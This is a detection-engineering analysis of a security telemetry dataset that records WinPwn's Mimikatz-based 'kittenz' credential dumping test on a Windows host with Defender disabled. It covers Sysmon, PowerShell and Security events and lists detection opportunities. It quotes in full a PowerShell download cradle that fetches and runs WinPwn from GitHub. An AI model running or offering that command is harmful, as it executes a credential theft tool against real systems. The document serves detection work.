# T1555.003-12: Credentials from Web Browsers — WinPwn - Loot Local Credentials - mimi-kittenz

## Technique Context

MITRE ATT&CK T1555.003 (Credentials from Web Browsers) encompasses credential dumping via offensive PowerShell frameworks. WinPwn's `kittenz` function is a PowerShell wrapper around Mimikatz-derived credential extraction logic that targets browser credential stores and local credential caches. Unlike `browserpwn` (test 11), which focuses on browser credential files, `kittenz` uses Mimikatz's `sekurlsa` and related modules to extract credentials from memory and local stores. This is a higher-privilege, more aggressive credential access function that may target LSASS in addition to browser credential databases.

With Windows Defender disabled, `kittenz` is free to download WinPwn, execute the full Mimikatz-backed credential extraction logic, and interact with LSASS and browser stores without AMSI interception.

## What This Dataset Contains

This dataset was captured on ACME-WS06 (Windows 11 Enterprise, domain acme.local) on 2026-03-17 with Defender disabled, spanning approximately 13 seconds. It contains 150 events across four channels: 31 Sysmon, 113 PowerShell, 4 Security, and 2 Application.

**Command executed (Sysmon EID=1 and Security EID=4688):**
```
"powershell.exe" & {iex(new-object net.webclient).downloadstring(
  'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
kittenz -consoleoutput -noninteractive}
```
The full command line appears verbatim in both Security EID=4688 (process creation audit) and Sysmon EID=1, running as `NT AUTHORITY\SYSTEM` at integrity level System from `C:\Windows\TEMP\`.

**PowerShell script block logging (EID=4104):** 110 script block events capturing the WinPwn download cradle invocation, the `kittenz -consoleoutput -noninteractive` call, and WinPwn's extensive internal function library as it was evaluated. The pinned commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` appears in the script block, providing a precise version anchor for threat intelligence.

**Sysmon EID=22 (DNS Query):** DNS query for `raw.githubusercontent.com` confirming the outbound download request was initiated.

**Sysmon EID=3 (Network Connection):** Outbound TCP connection from `powershell.exe` to `185.199.111.133:443` — the actual HTTPS connection to GitHub's CDN to download WinPwn.ps1. This is a clear network indicator attributable to the PowerShell process.

**Sysmon EID=10 (Process Access):** Four EID=10 events showing `powershell.exe` (PID 3128) accessing child processes at `GrantedAccess: 0x1FFFFF` (PROCESS_ALL_ACCESS), tagged `technique_id=T1055.001,technique_name=Dynamic-link Library Injection`. The targets include both `whoami.exe` and child `powershell.exe` instances.

**Sysmon EID=1 (Process Create):** Four process creations:
- `whoami.exe` (tagged T1033) — ART test framework identity check, parent `powershell.exe`
- `powershell.exe` (tagged T1059.001) — the kittenz execution shell, command line contains the full WinPwn download cradle
- A second `whoami.exe` (tagged T1033) — cleanup-phase identity check
- A second `powershell.exe` (tagged T1059.001) — cleanup phase, command line `"powershell.exe" & {}`

**Sysmon EID=17 (Pipe Created):** Named pipe `\PSHost.134182417938409056.3128.DefaultAppDomain.powershell` created by the test framework PowerShell — standard PowerShell console host infrastructure.

**Sysmon EID=11 (File Created):** One file creation event: `C:\Windows\Temp\01dcb632c4ec31db` created by `MsMpEng.exe` — a Windows Defender temporary scan artifact generated when Defender's engine inspects activity even with real-time protection disabled (the engine still runs in passive mode).

**Security EID=4688:** Four process creation events (all SYSTEM context, `LogonId: 0x3E7`) capturing `whoami.exe` twice and the WinPwn PowerShell invocation.

## What This Dataset Does Not Contain

**No LSASS process access events.** Even with Defender disabled, no Sysmon EID=10 targeting `lsass.exe` appears in the samples. The EID=10 events present show PowerShell accessing its own child processes — not LSASS. This may indicate `kittenz` reached the LSASS phase and logged that access in events not included in the sample set, or that the kittenz function took a code path that did not require LSASS handle acquisition for the credential access it attempted.

**No credential output files.** No Sysmon EID=11 events show credential dump files written to disk by PowerShell or WinPwn components.

**No Sysmon EID=7 (Image Load) for Mimikatz-derived DLLs.** The 17 EID=7 events present are standard DLL loads into the PowerShell host process. Mimikatz's in-memory components are loaded reflectively and do not generate named-DLL image load events.

**Comparison with the defended variant:** In the defended dataset (sysmon: 28, security: 10, powershell: 51), AMSI intercepted the WinPwn script before the credential extraction logic executed. The PowerShell event count there was 51 — almost entirely boilerplate. Here, 113 PowerShell events appear, reflecting the full WinPwn function library being evaluated and logged. The Sysmon EID=3 network connection event in this dataset is attributed to `powershell.exe` directly; in the defended variant it appeared from `MsMpEng.exe` performing a cloud reputation lookup.

## Assessment

This dataset provides a materially more complete picture of WinPwn kittenz activity than the defended variant. The 113 PowerShell EID=4104 events include WinPwn's internal function definitions and the full credential extraction invocation chain — content that was absent in the defended dataset where AMSI blocked evaluation. The EID=3 network connection directly attributing outbound HTTPS to `powershell.exe` is a higher-fidelity indicator than the MsMpEng-sourced connection in the defended run.

The dataset's limitation is the absence of downstream credential access events: no LSASS handle acquisition, no credential file writes. You can observe WinPwn downloading and initializing, but not the credential exfiltration outcome. Whether this reflects a gap in sampling or a genuine constraint of the SYSTEM-context execution environment is worth noting when using this data for detection development.

## Detection Opportunities Present in This Data

**PowerShell EID=4104 download cradle pattern:** The script block `iex(new-object net.webclient).downloadstring(...)` combined with a tool-specific function call (`kittenz`) in the same block is a high-confidence indicator. The pinned GitHub commit hash in the URL is a precise IOC.

**Sysmon EID=3 — PowerShell outbound to GitHub CDN:** An outbound HTTPS connection from `powershell.exe` to `185.199.111.133:443` (raw.githubusercontent.com) paired with a subsequent credential-related script block is a behavioral anchor.

**Sysmon EID=22 — PowerShell DNS for raw.githubusercontent.com:** DNS queries from PowerShell to `raw.githubusercontent.com` warrant scrutiny in environments where this is not routine.

**Sysmon EID=1 — PowerShell parent spawning PowerShell child with download cradle:** The process lineage `powershell.exe` (parent, command: `powershell`) → `powershell.exe` (child, command: full download cradle) is a consistent ART test framework pattern but also reflects real-world `iex` download patterns.

**Sysmon EID=10 — PROCESS_ALL_ACCESS from PowerShell to child processes:** While the targets here are PowerShell's own children, this access mask pattern in combination with other indicators elevates the event's relevance.
